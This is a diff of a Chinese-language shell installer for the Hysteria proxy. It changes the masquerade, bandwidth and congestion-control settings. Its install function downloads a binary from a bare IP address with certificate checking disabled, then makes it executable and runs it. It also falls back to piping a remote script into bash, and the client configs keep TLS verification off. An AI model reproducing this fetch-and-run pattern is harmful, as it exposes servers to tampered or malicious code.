@@ -192,20 +192,12 @@ auth:
   type: password
   password: $password
 
-masquerade:
-  proxy:
-    url: https://www.bing.com
-    rewriteHost: true
-
 quic:
   initStreamReceiveWindow: 26843545
   maxStreamReceiveWindow: 26843545
   initConnReceiveWindow: 67108864
   maxConnReceiveWindow: 67108864
-
-bandwidth:
-  up: 195 mbps
-  down: 195 mbps
+  
 EOF
     
 # 获取端口跳跃范围
@@ -233,7 +225,7 @@ EOF
         local client_config="/root/${domain}_${min_port}-${max_port}_${http_port}.json"
         cat > "$client_config" << EOF
 {
-    "server": "$domain:$min_port-$max_port",
+    "server": "$domain:$port",
     "auth": "$password",
     "transport": {
         "type": "udp",
@@ -242,7 +234,6 @@ EOF
         }
     },
     "tls": {
-        "sni": "https://www.bing.com",
         "insecure": true,
         "alpn": ["h3"]
     },
@@ -253,8 +244,8 @@ EOF
         "maxConnReceiveWindow": 67108864
     },
     "bandwidth": {
-        "up": "195 mbps",
-        "down": "195 mbps"
+        "up": "185 mbps",
+        "down": "185 mbps"
     },
     "http": {
         "listen": "0.0.0.0:$http_port"
@@ -278,7 +269,6 @@ else
         }
     },
     "tls": {
-        "sni": "https://www.bing.com",
         "insecure": true,
         "alpn": ["h3"]
     },
@@ -289,8 +279,8 @@ else
         "maxConnReceiveWindow": 67108864
     },
     "bandwidth": {
-        "up": "195 mbps",
-        "down": "195 mbps"
+        "up": "185 mbps",
+        "down": "185 mbps"
     },
     "http": {
         "listen": "0.0.0.0:$http_port"
@@ -732,19 +722,45 @@ optimize() {
     # 提供用户选择模式
     printf "%b请选择拥塞控制模式:%b\n" "${YELLOW}" "${NC}"
     echo "1. Brutal 拥塞控制"
-    echo "2. tcp_nanqinlang 拥塞控制"
-    read -p "请输入选择 [1-2]: " congestion_control_choice
+    echo "2. BBR 拥塞控制"
+    echo "3. 两者结合 (BBR+FQ)"
+    read -p "请输入选择 [1-3]: " congestion_control_choice
 
-    if [ "$congestion_control_choice" -eq 1 ]; then
-        congestion_control="brutal"
-    elif [ "$congestion_control_choice" -eq 2 ]; then
-        congestion_control="nanqinlang"
-    else
-        printf "%b无效选择，默认使用 Brutal 拥塞控制%b\n" "${RED}" "${NC}"
-        congestion_control="brutal"
+    case "$congestion_control_choice" in
+        1)
+            congestion_control="brutal"
+            ;;
+        2)
+            congestion_control="bbr"
+            ;;
+        3)
+            congestion_control="bbr"
+            default_qdisc="fq"
+            ;;
+        *)
+            printf "%b无效选择，默认使用 Brutal 拥塞控制%b\n" "${RED}" "${NC}"
+            congestion_control="brutal"
+            ;;
+    esac
+    
+    # 确保 BBR 可用
+    if [[ "$congestion_control" == "bbr" ]]; then
+        if ! lsmod | grep -q bbr; then
+            printf "%bBBR 未启用，正在安装...%b\n" "${YELLOW}" "${NC}"
+            echo "tcp_bbr" | tee /etc/modules-load.d/bbr.conf
+            modprobe tcp_bbr
+            cat >> /etc/sysctl.d/99-bbr.conf << EOF
+net.core.default_qdisc=fq
+net.ipv4.tcp_congestion_control=bbr
+EOF
+            sysctl --system
+            printf "%bBBR 已成功启用！%b\n" "${GREEN}" "${NC}"
+        else
+            printf "%bBBR 已经启用，无需重复安装。%b\n" "${GREEN}" "${NC}"
+        fi
     fi
     
-    # 创建sysctl配置文件
+    # 创建 sysctl 配置文件
     cat > /etc/sysctl.d/99-hysteria.conf << EOF
 # 设置16MB缓冲区
 net.core.rmem_max=16777216
@@ -755,9 +771,16 @@ net.core.wmem_default=16777216
 net.ipv4.tcp_rmem=4096 87380 16777216
 net.ipv4.tcp_wmem=4096 87380 16777216
 # 启用 $congestion_control 拥塞控制
-net.core.default_qdisc=fq
 net.ipv4.tcp_congestion_control=$congestion_control
-# 其他网络优化
+EOF
+
+    # 如果选择了 BBR+FQ，添加 default_qdisc 设置
+    if [ "$default_qdisc" == "fq" ]; then
+        echo "net.core.default_qdisc=fq" >> /etc/sysctl.d/99-hysteria.conf
+    fi
+    
+    # 其他网络优化
+    cat >> /etc/sysctl.d/99-hysteria.conf << EOF
 net.ipv4.tcp_fastopen=3
 net.ipv4.tcp_slow_start_after_idle=0
 # Hysteria QUIC优化
@@ -765,7 +788,7 @@ net.ipv4.ip_forward=1
 net.ipv4.tcp_mtu_probing=1
 EOF
     
-    # 立即应用sysctl设置
+    # 立即应用 sysctl 设置
     sysctl -p /etc/sysctl.d/99-hysteria.conf
     
     # 设置系统文件描述符限制
@@ -795,10 +818,11 @@ EOF
     printf "%b系统优化完成，已设置：%b\n" "${GREEN}" "${NC}"
     echo "1. 发送/接收缓冲区: 16MB"
     echo "2. 文件描述符限制: 1000000"
-    echo "3. $congestion_control 拥塞控制"
-    echo "4. TCP Fast Open"
-    echo "5. QUIC优化"
-    echo "6. CPU 调度优先级"
+    echo "3. 拥塞控制: $congestion_control"
+    [ "$default_qdisc" == "fq" ] && echo "4. 默认队列规则: fq"
+    echo "5. TCP Fast Open"
+    echo "6. QUIC优化"
+    echo "7. CPU 调度优先级"
     sleep 2
 }
 
@@ -927,21 +951,26 @@ install_hysteria() {
     printf "%b开始安装Hysteria...%b\n" "${YELLOW}" "${NC}"
     
     local urls=(
-        "http://47.239.144.129:8888/down/mpNeirWsvPyx"
+        "https://47.76.180.181:34164/down/ZMeXKe2ndY8z"
         "https://gh.ddlc.top/https://github.com/apernet/hysteria/releases/latest/download/hysteria-linux-amd64"
         "https://hub.gitmirror.com/https://github.com/apernet/hysteria/releases/latest/download/hysteria-linux-amd64"
     )
     
     for url in "${urls[@]}"; do
         printf "%b尝试从 %s 下载...%b\n" "${YELLOW}" "$url" "${NC}"
-        if wget -O /usr/local/bin/hysteria "$url" && 
-           chmod +x /usr/local/bin/hysteria &&
+        
+        # 使用 wget 下载文件并检查是否成功
+        if wget --no-check-certificate -O /usr/local/bin/hysteria "$url" && \
+           chmod +x /usr/local/bin/hysteria && \
            /usr/local/bin/hysteria version >/dev/null 2>&1; then
             printf "%bHysteria安装成功%b\n" "${GREEN}" "${NC}"
             return 0
+        else
+            printf "%b从 %s 下载失败...%b\n" "${RED}" "$url" "${NC}"
         fi
     done
     
+    # 如果所有下载源都失败，尝试使用 curl 安装
     if curl -fsSL https://get.hy2.dev/ | bash; then
         printf "%bHysteria安装成功%b\n" "${GREEN}" "${NC}"
         return 0
